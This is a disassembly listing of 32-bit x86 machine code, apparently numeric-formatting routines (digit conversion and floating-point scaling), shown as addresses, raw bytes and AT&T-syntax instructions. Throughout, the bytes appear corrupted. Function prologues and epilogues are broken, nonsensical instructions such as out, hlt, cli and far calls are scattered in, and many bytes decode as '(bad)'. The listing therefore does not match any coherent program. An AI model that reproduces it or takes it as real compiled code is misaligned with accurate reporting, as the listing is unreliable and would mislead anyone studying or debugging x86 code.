  407e74:	f7 63 60             	mull   0x60(%ebx)
  407e77:	85 c0                	test   %eax,%eax
  407e79:	8b fa                	mov    %edx,%edi
  407e7b:	7e 05                	jle    0x407e82
  407e7d:	04 30                	add    $0x30,%al
  407e7f:	88 06                	mov    %al,(%esi)
  407e81:	30 8b c3 60 0a 00    	xor    %cl,0xa60c3(%ebx)
  407e87:	00 0c 99             	add    %cl,(%ecx,%ebx,4)
  407e8a:	f7 f9                	idiv   %ecx
  407e8c:	85 c0                	test   %eax,%eax
  407e8e:	8b ca                	mov    %edx,%ecx
  407e90:	7e 17                	jle    0x407ea9
  407e92:	b8 67 66 66 c1       	mov    $0xc1666667,%eax
  407e97:	2f                   	das
  407e98:	ef                   	out    %eax,(%dx)
  407e99:	c1 fa 02             	sar    $0x2,%edx
  407e9c:	8b c2                	mov    %edx,%eax
  407e9e:	bd e8 37 03 d0       	mov    $0xd00337e8,%ebp
  407ea3:	80 c2 30             	add    $0x30,%dl
  407ea6:	88 16                	mov    %dl,(%esi)
  407ea8:	46                   	inc    %esi
  407ea9:	80 c1 30             	add    $0x30,%cl
  407eac:	88 0e                	mov    %cl,(%esi)
  407eae:	49                   	dec    %ecx
  407eaf:	4a                   	dec    %edx
  407eb0:	ff                   	(bad)
  407eb1:	ff                   	(bad)
  407eb2:	ff 8b c2 c6 87 dc    	decl   -0x2378393e(%ebx)
  407eb8:	5f                   	pop    %edi
  407eb9:	5e                   	pop    %esi
  407eba:	8b e5                	mov    %ebp,%esp
  407ebc:	5d                   	pop    %ebp
  407ebd:	c3                   	ret
  407ebe:	90                   	nop
  407ebf:	e9 55 8b ec 18       	jmp    0x192d0a19
  407ec4:	45                   	inc    %ebp
  407ec5:	1c 8b                	sbb    $0x8b,%al
  407ec7:	4d                   	dec    %ebp
  407ec8:	18 8b 55 d8 92 8b    	sbb    %cl,-0x746d27ab(%ebx)
  407ece:	45                   	inc    %ebp
  407ecf:	10 6a 01             	adc    %ch,0x1(%edx)
  407ed2:	d2 1d 4d 0c 52 8b    	rcrb   %cl,0x8b520c4d
  407ed8:	55                   	push   %ebp
  407ed9:	08 50 51             	or     %dl,0x51(%eax)
  407edc:	c2 e8 e7             	ret    $0xe7e8
  407edf:	00 4c 00 e4          	add    %cl,-0x1c(%eax,%eax,1)
  407ee3:	c4 1c 5d c3 90 90 90 	les    -0x6f6f6f3d(,%ebx,2),%ebx
  407eea:	90                   	nop
  407eeb:	90                   	nop
  407eec:	90                   	nop
  407eed:	90                   	nop
  407eee:	90                   	nop
  407eef:	90                   	nop
  407ef0:	55                   	push   %ebp
  407ef1:	8b ec                	mov    %esp,%ebp
  407ef3:	83 ec 8d             	sub    $0xffffff8d,%esp
  407ef6:	83 68 10 4f          	subl   $0x4f,0x10(%eax)
  407efa:	7c 07                	jl     0x407f03
  407efc:	13 45 10             	adc    0x10(%ebp),%eax
  407eff:	74 00                	je     0x407f01
  407f01:	00 00                	add    %al,(%eax)
  407f03:	dd b5 08 c1 1d 2d    	fnsave 0x2d1dc108(%ebp)
  407f09:	fd                   	std
  407f0a:	40                   	inc    %eax
  407f0b:	00 8b 4d 18 53 8f    	add    %cl,-0x70ace7b3(%ebx)
  407f11:	e2 d4                	loop   0x407ee7
  407f13:	56                   	push   %esi
  407f14:	33 f6                	xor    %esi,%esi
  407f16:	07                   	pop    %es
  407f17:	df e0                	fnstsw %ax
  407f19:	a3 80 b9 89 31       	mov    %eax,0x3189b980
  407f1e:	40                   	inc    %eax
  407f1f:	c4 05 8b fb 7a 0e    	les    0xe7afb8b,%eax
  407f25:	dd 45 08             	fldl   0x8(%ebp)
  407f28:	d9 e0                	fchs
  407f2a:	dd 5d 08             	fstpl  0x8(%ebp)
  407f2d:	66 01 01             	add    %ax,(%ecx)
  407f30:	00 00                	add    %al,(%eax)
  407f32:	00 8b 4d 0c 41 83    	add    %cl,-0x7cbef3b3(%ebx)
  407f38:	08 8d 45 b3 50 51    	or     %cl,0x5150b345(%ebp)
  407f3e:	52                   	push   %edx
  407f3f:	6e                   	outsb  %ds:(%esi),(%dx)
  407f40:	15 18 c1 40 23       	adc    $0x2340c118,%eax
  407f45:	dd 5d 08             	fstpl  0x8(%ebp)
  407f48:	dd 45 c0             	fldl   -0x40(%ebp)
  407f4b:	dc e1                	fsub   %st,%st(1)
  407f4d:	30 c2                	xor    %al,%dl
  407f4f:	40                   	inc    %eax
  407f50:	44                   	inc    %esp
  407f51:	af                   	scas   %es:(%edi),%eax
  407f52:	8f                   	(bad)
  407f53:	0c df                	or     $0xdf,%al
  407f55:	07                   	pop    %es
  407f56:	fa                   	cli
  407f57:	c4 44 7b d5          	les    -0x2b(%ebx,%edi,2),%eax
  407f5b:	8d 73 50             	lea    0x50(%ebx),%esi
  407f5e:	7a f4                	jp     0x407f54
  407f60:	27                   	daa
  407f61:	58                   	pop    %eax
  407f62:	dd 45 ec             	fldl   -0x14(%ebp)
  407f65:	91                   	xchg   %eax,%ecx
  407f66:	1d 30 c2 40 00       	sbb    $0x40c230,%eax
  407f6b:	df e0                	fnstsw %ax
  407f6d:	f6 c4 44             	test   $0x44,%ah
  407f70:	7b 48                	jnp    0x407fba
  407f72:	dd 45 ec             	fldl   -0x14(%ebp)
  407f75:	dc 0d 10 c3 40 00    	fmull  0x40c310
  407f7b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407f7e:	50                   	push   %eax
  407f7f:	83 ec 08             	sub    $0x8,%esp
  407f82:	dd 1c 24             	fstpl  (%esp)
  407f85:	ff 15 b1 c1 40 67    	call   *0x6740c1b1
  407f8b:	dd 5d f4             	fstpl  -0xc(%ebp)
  407f8e:	dd 45 f4             	fldl   -0xc(%ebp)
  407f91:	dc 05 08 c3 40 dd    	faddl  0xdd40c308
  407f97:	83 c4 0c             	add    $0xc,%esp
  407f9a:	4e                   	dec    %esi
  407f9b:	dc 0d 00 08 40 00    	fmull  0x400800
  407fa1:	e8 da 35 00 00       	call   0x40b580
  407fa6:	8b 5d 20             	mov    0x20(%ebp),%ebx
  407fa9:	b1 30                	mov    $0x30,%cl
  407fab:	2a c8                	sub    %al,%cl
  407fad:	88 0e                	mov    %cl,(%esi)
  407faf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407fb2:	41                   	inc    %ecx
  407fb3:	3b f3                	cmp    %ebx,%esi
  407fb5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407fb8:	bf f8 2e 78 50       	mov    $0x50782ef8,%edi
  407fbd:	22 f0                	and    %al,%dh
  407fbf:	1b 5c 8a 16          	sbb    0x16(%edx,%ecx,4),%ebx
  407fc3:	88 17                	mov    %dl,(%edi)
  407fc5:	47                   	inc    %edi
  407fc6:	46                   	inc    %esi
  407fc7:	3b b2 72 f6 eb 50    	cmp    0x50ebf672(%edx),%esi
  407fcd:	dd 06                	fldl   (%esi)
  407fcf:	46                   	inc    %esi
  407fd0:	dc 1d 30 24 c1 00    	fcompl 0xc12430
  407fd6:	df e0                	fnstsw %ax
  407fd8:	ee                   	out    %al,(%dx)
  407fd9:	00 41 72             	add    %al,0x72(%ecx)
  407fdc:	00 75 3e             	add    %dh,0x3e(%ebp)
  407fdf:	dd 45 bf             	fldl   -0x41(%ebp)
  407fe2:	dc 0d a7 c2 40 60    	fmull  0x6040c2a7
  407fe8:	dd 16                	fstl   (%esi)
  407fea:	f4                   	hlt
  407feb:	d9 c0                	fld    %st(0)
  407fed:	28 7a 28             	sub    %bh,0x28(%edx)
  407ff0:	c2 9a 00             	ret    $0x9a
  407ff3:	4e                   	dec    %esi
  407ff4:	e0 f6                	loopne 0x407fec
  407ff6:	4e                   	dec    %esi
  407ff7:	05 7a 21 dd 55       	add    $0x55dd217a,%eax
  407ffc:	39 62 4f             	cmp    %esp,0x4f(%edx)
  407fff:	f8                   	clc
  408000:	c2 40 00             	ret    $0x40
  408003:	f9                   	stc
  408004:	5d                   	pop    %ebp
  408005:	c0 a5 1d 28 c2 67 00 	shlb   $0x0,0x67c2281d(%ebp)
  40800c:	df e0                	fnstsw %ax
  40800e:	f6 c4 05             	test   $0x5,%ah
  408011:	7b e7                	jnp    0x407ffa
  408013:	dd 5d 09             	fstpl  0x9(%ebp)
  408016:	89 4d 18             	mov    %ecx,0x18(%ebp)
  408019:	eb 2c                	jmp    0x408047
  40801b:	dd 8e 8b 45 10 8d    	fisttpll -0x72efba75(%esi)
  408021:	34 18                	xor    $0x18,%al
  408023:	8b 45 1c             	mov    0x1c(%ebp),%eax
  408026:	85 5b 75             	test   %ebx,0x75(%ebx)
  408029:	1f                   	pop    %ds
  40802a:	03 75 fc             	add    -0x4(%ebp),%esi
  40802d:	8b 4d 14             	mov    0x14(%ebp),%ecx
  408030:	3b f3                	cmp    %ebx,%esi
  408032:	73 5c                	jae    0x408090
  408034:	8b 45 10             	mov    0x10(%ebp),%eax
  408037:	5f                   	pop    %edi
  408038:	f7 d8                	neg    %eax
  40803a:	89 01                	mov    %eax,(%ecx)
  40803c:	c6 03 00             	movb   $0x0,(%ebx)
  40803f:	7a 03                	jp     0x408044
  408041:	5e                   	pop    %esi
  408042:	5b                   	pop    %ebx
  408043:	cd e5                	int    $0xe5
  408045:	5d                   	pop    %ebp
  408046:	c3                   	ret
  408047:	2c 55                	sub    $0x55,%al
  408049:	fc                   	cld
  40804a:	b2 57                	mov    $0x57,%dl
  40804c:	89 11                	mov    %edx,(%ecx)
  40804e:	77 3c                	ja     0x40808c
  408050:	dd 45 08             	fldl   0x8(%ebp)
  408053:	8d                   	lea    (bad),%eax
  408054:	c1 50 3b f8          	rcll   $0xf8,0x3b(%eax)
  408058:	73 30                	jae    0x40808a
  40805a:	34 0d                	xor    $0xd,%al
  40805c:	f8                   	clc
  40805d:	c2 40 00             	ret    $0x40
  408060:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408063:	50                   	push   %eax
  408064:	83 ec 08             	sub    $0x8,%esp
  408067:	25 1c 24 ff 3b       	and    $0x3bff241c,%eax
  40806c:	18 c1                	sbb    %al,%cl
  40806e:	25 c6 dd 45 7e       	and    $0x7e45ddc6,%eax
  408073:	83 c4 0c             	add    $0xc,%esp
  408076:	e8 05 35 00 00       	call   0x40b580
  40807b:	8b 4d 81             	mov    -0x7f(%ebp),%ecx
  40807e:	8b 5d 20             	mov    0x20(%ebp),%ebx
  408081:	04 30                	add    $0x30,%al
  408083:	18 07                	sbb    %al,(%edi)
  408085:	47                   	inc    %edi
  408086:	3b fe                	cmp    %esi,%edi
  408088:	76 3c                	jbe    0x4080c6
  40808a:	dd d8                	fstp   %st(0)
  40808c:	8d 53 6f             	lea    0x6f(%ebx),%edx
  40808f:	3b f2                	cmp    %edx,%esi
  408091:	72 07                	jb     0x40809a
  408093:	5f                   	pop    %edi
  408094:	c6 43 4f 00          	movb   $0x0,0x4f(%ebx)
  408098:	b8 c3 5e 5b 8b       	mov    $0x8b5b5ec3,%eax
  40809d:	f7 5d c3             	negl   -0x3d(%ebp)
  4080a0:	8a 16                	mov    (%esi),%dl
  4080a2:	29 c6                	sub    %eax,%esi
  4080a4:	e3 c2                	jecxz  0x408068
  4080a6:	b4 80                	mov    $0x80,%ah
  4080a8:	fa                   	cli
  4080a9:	39 97 16 7e 28 8b    	cmp    %edx,-0x74d781ea(%edi)
  4080af:	55                   	push   %ebp
  4080b0:	1c 3b                	sbb    $0x3b,%al
  4080b2:	f3 c6 06 30          	xrelease movb $0x30,(%esi)
  4080b6:	76 05                	jbe    0x4080bd
  4080b8:	4e                   	dec    %esi
  4080b9:	fe 06                	incb   (%esi)
  4080bb:	eb 14                	jmp    0x4080d1
  4080bd:	c6 06 31             	movb   $0x31,(%esi)
  4080c0:	8b 39                	mov    (%ecx),%edi
  4080c2:	9a 85 d2 89 39 75 17 	lcall  $0x1775,$0x3989d285
  4080c9:	3b c3                	cmp    %ebx,%eax
  4080cb:	76 77                	jbe    0x408144
  4080cd:	f6 00 30             	testb  $0x30,(%eax)
  4080d0:	40                   	inc    %eax
  4080d1:	80 3e 39             	cmpb   $0x39,(%esi)
  4080d4:	d6                   	salc
  4080d5:	db c6                	fcmovnb %st(6),%st
  4080d7:	00 59 5f             	add    %bl,0x5f(%ecx)
  4080da:	8b c3                	mov    %ebx,%eax
  4080dc:	5e                   	pop    %esi
  4080dd:	5b                   	pop    %ebx
  4080de:	8b e5                	mov    %ebp,%esp
  4080e0:	5d                   	pop    %ebp
  4080e1:	c3                   	ret
  4080e2:	90                   	nop
  4080e3:	90                   	nop
  4080e4:	90                   	nop
  4080e5:	35 90 90 1f 90       	xor    $0x901f9090,%eax
  4080ea:	90                   	nop
  4080eb:	90                   	nop
  4080ec:	90                   	nop
  4080ed:	90                   	nop
  4080ee:	c4 13                	les    (%ebx),%edx
  4080f0:	55                   	push   %ebp
  4080f1:	8b ec                	mov    %esp,%ebp
  4080f3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4080f6:	8b 4d 93             	mov    -0x6d(%ebp),%ecx
  4080f9:	53                   	push   %ebx
  4080fa:	56                   	push   %esi
  4080fb:	39 8b 7d 14 85 c0    	cmp    %ecx,-0x3f7aeb83(%ebx)
  408101:	8b 59 82             	mov    -0x7e(%ecx),%ebx
  408104:	0b 8b 45 10 c7 16    	or     0x16c71045(%ebx),%ecx
  40810a:	00 00                	add    %al,(%eax)
  40810c:	00 00                	add    %al,(%eax)
  40810e:	eb 12                	jmp    0x408122
  408110:	8b 55 10             	mov    0x10(%ebp),%edx
  408113:	33 c0                	xor    %eax,%eax
  408115:	30 50 0f             	xor    %dl,0xf(%eax)
  408118:	9c                   	pushf
  408119:	37                   	aaa
  40811a:	85 c0                	test   %eax,%eax
  40811c:	89 02                	mov    %eax,(%edx)
  40811e:	74 02                	je     0x408122
  408120:	14 d9                	adc    $0xd9,%al
  408122:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  408127:	bb 9c f7 e1 4e       	mov    $0x4ee1f79c,%ebx
  40812c:	66 03 8a c2 4e f6 eb 	add    -0x1409b13e(%edx),%cx
  408133:	2a c8                	sub    %al,%cl
  408135:	80 c1 30             	add    $0x30,%cl
  408138:	88 0e                	mov    %cl,(%esi)
  40813a:	8b ca                	mov    %edx,%ecx
  40813c:	85 d2                	test   %edx,%edx
  40813e:	75 e2                	jne    0x408122
  408140:	3f                   	aas
  408141:	45                   	inc    %ebp
  408142:	ca 2b fe             	lret   $0xfe2b
  408145:	99                   	cltd
  408146:	38 8b c6 5f 5e 5b    	cmp    %cl,0x5b5e5fc6(%ebx)
  40814c:	5d                   	pop    %ebp
  40814d:	d3 8f 90 55 68 ec    	rorl   %cl,-0x1397aa70(%edi)
  408153:	8b 45 04             	mov    0x4(%ebp),%eax
  408156:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408159:	53                   	push   %ebx
  40815a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40815d:	57                   	push   %edi
  40815e:	8b 7d 18             	mov    0x18(%ebp),%edi
  408161:	85 c0                	test   %eax,%eax
  408163:	77 0d                	ja     0x408172
  408165:	72 05                	jb     0x40816c
  408167:	83 fb ff             	cmp    $0xffffffff,%ebx
  40816a:	d5 04                	aad    $0x4
  40816c:	85 c9                	test   %ecx,%ecx
  40816e:	75 21                	jne    0x408191
  408170:	fd                   	std
  408171:	c0 03 34             	rolb   $0x34,(%ebx)
  408174:	7c 59                	jl     0x4081cf
  408176:	81 fb ff ff ff 7f    	cmp    $0x7fffffff,%ebx
  40817c:	77 2a                	ja     0x4081a8
  40817e:	83 f8 ff             	cmp    $0xffffffff,%eax
  408181:	7c 25                	jl     0x4081a8
  408183:	c0 08 81             	rorb   $0x81,(%eax)
  408186:	fb                   	sti
  408187:	00 00                	add    %al,(%eax)
  408189:	00 80 72 1b 85 c9    	add    %al,-0x367ae48e(%eax)
  40818f:	75 1b                	jne    0x4081ac
  408191:	8b 45 1c             	mov    0x1c(%ebp),%eax
  408194:	8b ea                	mov    %edx,%ebp
  408196:	14 50                	adc    $0x50,%al
  408198:	1f                   	pop    %ds
  408199:	52                   	push   %edx
  40819a:	8e 53 e8             	mov    -0x18(%ebx),%ss
  40819d:	4d                   	dec    %ebp
  40819e:	47                   	inc    %edi
  40819f:	ff                   	(bad)
  4081a0:	ff 83 c4 14 8c 5b    	incl   0x5b8c14c4(%ebx)
  4081a6:	8c c3                	mov    %es,%ebx
  4081a8:	97                   	xchg   %eax,%edi
  4081a9:	c9                   	leave
  4081aa:	db 6c 8b 4d          	fldt   0x4d(%ebx,%ecx,4)
  4081ae:	14 c7                	adc    $0xc7,%al
  4081b0:	01 00                	add    %eax,(%eax)
  4081b2:	00 23                	add    %ah,(%ebx)
  4081b4:	00 eb                	add    %ch,%bl
  4081b6:	23 85 c0 7f 0d 7c    	and    0x7c0d7fc0(%ebp),%eax
  4081bc:	04 85                	add    $0x85,%al
  4081be:	80 73 07 7f          	xorb   $0x7f,0x7(%ebx)
  4081c2:	01 00                	add    %eax,(%eax)
  4081c4:	00 00                	add    %al,(%eax)
  4081c6:	eb 02                	jmp    0x4081ca
  4081c8:	33 c9                	xor    %ecx,%ecx
  4081ca:	8b 55 14             	mov    0x14(%ebp),%edx
  4081cd:	85 c9                	test   %ecx,%ecx
  4081cf:	89 0a                	mov    %ecx,(%edx)
  4081d1:	5d                   	pop    %ebp
  4081d2:	07                   	pop    %es
  4081d3:	f7 74 83 0b          	divl   0xb(%ebx,%eax,4)
  4081d7:	00 f7                	add    %dh,%bh
  4081d9:	d8 57 6a             	fcoms  0x6a(%edi)
  4081dc:	00 6a 0a             	add    %ch,0xa(%edx)
  4081df:	b3 53                	mov    $0x53,%bl
  4081e1:	e8 aa 36 48 50       	call   0x5088b890
  4081e6:	8b c8                	mov    %eax,%ecx
  4081e8:	33 f2                	xor    %edx,%esi
  4081ea:	8a c1                	mov    %cl,%al
  4081ec:	9a 0a f6 ea 2a d8 4f 	lcall  $0x4fd8,$0x2aeaf60a
  4081f3:	60                   	pusha
  4081f4:	c2 60 8b             	ret    $0x8b60
  4081f7:	c6                   	(bad)
  4081f8:	88 0a                	mov    %cl,(%edx)
  4081fa:	cc                   	int3
  4081fb:	d9 0b                	(bad) (%ebx)
  4081fd:	ce                   	into
  4081fe:	75 db                	jne    0x4081db
  408200:	db 45 18             	fildl  0x18(%ebp)
  408203:	8b f4                	mov    %esp,%esi
  408205:	1c 2b                	sbb    $0x2b,%al
  408207:	c7                   	(bad)
  408208:	5e                   	pop    %esi
  408209:	10 92 e1 d2 5f 5b    	adc    %dl,0x5b5fd2e1(%edx)
  40820f:	5d                   	pop    %ebp
  408210:	c3                   	ret
  408211:	90                   	nop
  408212:	90                   	nop
  408213:	90                   	nop
  408214:	90                   	nop
  408215:	90                   	nop
  408216:	90                   	nop
  408217:	90                   	nop
  408218:	90                   	nop
  408219:	90                   	nop
  40821a:	90                   	nop
  40821b:	90                   	nop
  40821c:	90                   	nop
  40821d:	90                   	nop
  40821e:	90                   	nop
  40821f:	90                   	nop
  408220:	55                   	push   %ebp
  408221:	15 ec 51 8b 03       	adc    $0x38b51ec,%eax
  408226:	08 53 48             	or     %dl,0x48(%ebx)
  408229:	8b 08                	mov    (%eax),%ecx
  40822b:	e4 64                	in     $0x64,%al
  40822d:	57                   	push   %edi
  40822e:	b0 c1                	mov    $0xc1,%al
  408230:	40                   	inc    %eax
  408231:	00 8b 75 45 46 d8    	add    %cl,-0x27b9ba8b(%ebx)
  408237:	91                   	xchg   %eax,%ecx
  408238:	55                   	push   %ebp
  408239:	08 8d 45 2c 52 8b    	or     %cl,-0x74add3bb(%ebp)
  40823f:	cb                   	lret
  408240:	56                   	push   %esi
  408241:	50                   	push   %eax
  408242:	81 e1 ff 00 00 aa    	and    $0xaa0000ff,%ecx
  408248:	0e                   	push   %cs
  408249:	01 51 89             	add    %edx,-0x77(%ecx)
  40824c:	5d                   	pop    %ebp
  40824d:	fc                   	cld
  40824e:	e8 9d 0c ff ff       	call   0x3f8ef0
  408253:	48                   	dec    %eax
  408254:	8d 55 08             	lea    0x8(%ebp),%edx
  408257:	52                   	push   %edx
  408258:	50                   	push   %eax
  408259:	a9 00 2e 8d 45       	test   $0x458d2e00,%eax
  40825e:	0c 33                	or     $0x33,%al
  408260:	c9                   	leave
  408261:	21 8a cf 6a 01 66    	and    %ecx,0x66016acf(%edx)
  408267:	e8 37 b1 4a ff       	call   0xff8b33a3
  40826c:	48                   	dec    %eax
  40826d:	8d ac 08 52 50 c6 00 	lea    0xc65052(%eax,%ecx,1),%ebp
  408274:	2e 8d 45 0c          	lea    %cs:0xc(%ebp),%eax
  408278:	3e c9                	ds leave
  40827a:	35 8a 4d 80 6a       	xor    $0x6a804d8a,%eax
  40827f:	01 51 e8             	add    %edx,-0x18(%ecx)
  408282:	35 fe ff ff 1f       	xor    $0x1ffffffe,%eax
  408287:	0c 55                	or     $0x55,%al
  408289:	08 52 50             	or     %dl,0x50(%edx)
  40828c:	c6 00 79             	movb   $0x79,(%eax)
  40828f:	8d 45 f1             	lea    -0xf(%ebp),%eax
  408292:	50                   	push   %eax
  408293:	6a 01                	push   $0x1
  408295:	c1 eb 73             	shr    $0x73,%ebx
  408298:	53                   	push   %ebx
  408299:	e8 52 fe df ff       	call   0x2080f0
  40829e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4082a1:	83 c4 50             	add    $0x50,%esp
  4082a4:	2b d0                	sub    %eax,%edx
  4082a6:	89 31                	mov    %esi,(%ecx)
  4082a8:	5e                   	pop    %esi
  4082a9:	5b                   	pop    %ebx
  4082aa:	8b e5                	mov    %ebp,%esp
  4082ac:	71 c3                	jno    0x408271
  4082ae:	1a 90 55 e7 ec 83    	sbb    -0x7c1318ab(%eax),%dl
  4082b4:	ec                   	in     (%dx),%al
  4082b5:	08 53 56             	or     %dl,0x56(%ebx)
  4082b8:	f7 45 fc 14 8b 7d 18 	testl  $0x187d8b14,-0x4(%ebp)
  4082bf:	50                   	push   %eax
  4082c0:	61                   	popa
  4082c1:	45                   	inc    %ebp
  4082c2:	08 de                	or     %bl,%dh
  4082c4:	4d                   	dec    %ebp
  4082c5:	0b 33                	or     (%ebx),%esi
  4082c7:	d2 57 66             	rclb   %cl,0x66(%edi)
  4082ca:	8b 50 0c             	mov    0xc(%eax),%edx
  4082cd:	51                   	push   %ecx
  4082ce:	6a 01                	push   $0x1
  4082d0:	52                   	push   %edx
  4082d1:	e8 1a fe ff ff       	call   0x4080f0
  4082d6:	8b d8                	mov    %eax,%ebx
  4082d8:	8b 45 62             	mov    0x62(%ebp),%eax
  4082db:	74 c4                	je     0x4082a1
  4082dd:	14 4b                	adc    $0x4b,%al
  4082df:	8d b7 00 fe ff cf    	lea    -0x30000200(%edi),%esi
  4082e5:	c6 03 3a             	movb   $0x3a,(%ebx)
  4082e8:	5b                   	pop    %ebx
  4082e9:	48                   	dec    %eax
  4082ea:	1c 50                	sbb    $0x50,%al
  4082ec:	51                   	push   %ecx
  4082ed:	56                   	push   %esi
  4082ee:	e8 9d ea ff ff       	call   0x406d90
  4082f3:	85 e9                	test   %ebp,%ecx
  4082f5:	74 14                	je     0x40830b
  4082f7:	8b 55 10             	mov    0x10(%ebp),%edx
  4082fa:	3f                   	aas
  4082fb:	2b fb                	sub    %ebx,%edi
  4082fd:	8b c3                	mov    %ebx,%eax
  4082ff:	c6 03 3f             	movb   $0x3f,(%ebx)
  408302:	89 3a                	mov    %edi,(%edx)
  408304:	3b 5e 5b             	cmp    0x5b(%esi),%ebx
  408307:	8b e5                	mov    %ebp,%esp
  408309:	5d                   	pop    %ebp
  40830a:	c3                   	ret
  40830b:	c7                   	(bad)
  40830c:	fe 83 c9 ff 75 c0    	incb   -0x3f8a0037(%ebx)
  408312:	f2 42                	repnz inc %edx
  408314:	f7 d1                	not    %ecx
  408316:	49                   	dec    %ecx
  408317:	2b d9                	sub    %ecx,%ebx
  408319:	8b c1                	mov    %ecx,%eax
  40831b:	8b fb                	mov    %ebx,%edi
  40831d:	c1 e9 02             	shr    $0x2,%ecx
  408320:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408322:	02 c8                	add    %al,%cl
  408324:	8b 45 0c             	mov    0xc(%ebp),%eax
  408327:	83 e1 03             	and    $0x3,%ecx
  40832a:	88 c3                	mov    %al,%bl
  40832c:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40832e:	8b 4d c7             	mov    -0x39(%ebp),%ecx
  408331:	ae                   	scas   %es:(%edi),%al
  408332:	5e                   	pop    %esi
  408333:	45                   	inc    %ebp
  408334:	f5                   	cmc
  408335:	8b 2d 5b 92 e5 5d    	mov    0x5de5925b,%ebp
  40833b:	ca 90 9e             	lret   $0x9e90
  40833e:	90                   	nop
  40833f:	90                   	nop
  408340:	55                   	push   %ebp
  408341:	62                   	(bad)
  408342:	ec                   	in     (%dx),%al
  408343:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408346:	8b 45 08             	mov    0x8(%ebp),%eax
  408349:	8b 55 0c             	mov    0xc(%ebp),%edx
  40834c:	da 8b 00 88 4d 08    	fimull 0x84d8800(%ebx)
  408352:	fa                   	cli
  408353:	51                   	push   %ecx
  408354:	6a 01                	push   $0x1
  408356:	50                   	push   %eax
  408357:	e8 94 fd ff ff       	call   0x4080f0
  40835c:	83 c4 14             	add    $0x14,%esp
  40835f:	5d                   	pop    %ebp
  408360:	c3                   	ret
  408361:	57                   	push   %edi
  408362:	90                   	nop
  408363:	90                   	nop
  408364:	90                   	nop
  408365:	90                   	nop
  408366:	6f                   	outsl  %ds:(%esi),(%dx)
  408367:	db fe                	(bad)
  408369:	ef                   	out    %eax,(%dx)
  40836a:	90                   	nop
  40836b:	ae                   	scas   %es:(%edi),%al
  40836c:	90                   	nop
  40836d:	42                   	inc    %edx
  40836e:	90                   	nop
  40836f:	90                   	nop
  408370:	f4                   	hlt
  408371:	8b ec                	mov    %esp,%ebp
  408373:	83 ec 5c             	sub    $0x5c,%esp
  408376:	8a fe                	mov    %dh,%bh
  408378:	08 53 56             	or     %dl,0x56(%ebx)
  40837b:	8b 75 20             	mov    0x20(%ebp),%esi
  40837e:	57                   	push   %edi
  40837f:	28 7d 18             	sub    %bh,0x18(%ebp)
  408382:	3c 66                	cmp    $0x66,%al
  408384:	75 1c                	jne    0x4083a2
  408386:	8b 4d 76             	mov    0x76(%ebp),%ecx
  408389:	a0 45 a4 50 8b       	mov    0x8b50a445,%al
  40838e:	45                   	inc    %ebp
  40838f:	10 8d 55 18 51 8b    	adc    %cl,-0x74aee7ab(%ebp)
  408395:	4d                   	dec    %ebp
  408396:	0c 52                	or     $0x52,%al
  408398:	57                   	push   %edi
  408399:	50                   	push   %eax
  40839a:	e6 e8                	out    %al,$0xe8
  40839c:	c0 01 00             	rolb   $0x0,(%ecx)
  40839f:	00 eb                	add    %ch,%bl
  4083a1:	1d 8e 45 fa 8d       	sbb    $0x8dfa458e,%eax
  4083a6:	55                   	push   %ebp
  4083a7:	00 52 44             	add    %dl,0x44(%edx)
  4083aa:	4d                   	dec    %ebp
  4083ab:	18 9f 48 45 10 8d    	sbb    %bl,-0x72efbab8(%edi)
  4083b1:	33 19                	xor    (%ecx),%ebx
  4083b3:	51                   	push   %ecx
  4083b4:	81 4d 8d 52 50 51 e8 	orl    $0xe8515052,-0x73(%ebp)
  4083bb:	01 fb                	add    %edi,%ebx
  4083bd:	2e ff 8b 15 74 c1 73 	decl   %cs:0x73c17415(%ebx)
  4083c4:	00 8b cd 83 8a 18    	add    %cl,0x188a83cd(%ebx)
  4083ca:	bc 3a 01 8a 15       	mov    $0x158a013a,%esp
  4083cf:	33 c0                	xor    %eax,%eax
  4083d1:	68 f7 01 00 00       	push   $0x1f7
  4083d6:	8a 03                	mov    (%ebx),%al
  4083d8:	50                   	push   %eax
  4083d9:	ff 15 68 c1 40 f4    	call   *0xf440c168
  4083df:	89 c4                	mov    %eax,%esp
  4083e1:	08 eb                	or     %ch,%bl
  4083e3:	15 8b 15 91 30       	adc    $0x3091158b,%eax
  4083e8:	40                   	inc    %eax
  4083e9:	cd 33                	int    $0x33
  4083eb:	c9                   	leave
  4083ec:	8a 6c 8b 02          	mov    0x2(%ebx,%ecx,4),%ch
  4083f0:	66 8b ee             	mov    %si,%bp
  4083f3:	48                   	dec    %eax
  4083f4:	25 eb 01 00 00       	and    $0x1eb,%eax
  4083f9:	85 c0                	test   %eax,%eax
  4083fb:	74 16                	je     0x408413
  4083fd:	8b fb                	mov    %ebx,%edi
  4083ff:	1a c9                	sbb    %cl,%cl
  408401:	ff 33                	push   (%ebx)
  408403:	c0 8b 55 24 f2 26 8b 	rorb   $0x8b,0x26f22455(%ebx)
  40840a:	3d 20 6c 80 66       	cmp    $0x66806c20,%eax
  40840f:	d1 49 92             	rorl   $1,-0x6e(%ecx)
  408412:	f8                   	clc
  408413:	89 0a                	mov    %ecx,(%edx)
  408415:	25 8b 03 c1 e9       	and    $0xe9c1038b,%eax
  40841a:	02 ad a5 8b ca 83    	add    -0x7c35745b(%ebp),%ch
  408420:	e1 03                	loope  0x408425
  408422:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408424:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  408427:	5f                   	pop    %edi
  408428:	5e                   	pop    %esi
  408429:	5b                   	pop    %ebx
  40842a:	c7 01 00 c0 00 00    	movl   $0xc000,(%ecx)
  408430:	25 0d 5d c3 8a       	and    $0x8ac35d0d,%eax
  408435:	55                   	push   %ebp
  408436:	08 01                	or     %al,(%ecx)
  408438:	fa                   	cli
  408439:	66 a3 6c 8b 45 18    	mov    %ax,0x18458b6c
  40843f:	85 da                	test   %ebx,%edx
  408441:	7f 41                	jg     0x408484
  408443:	54                   	push   %esp
  408444:	75 04                	jne    0x40844a
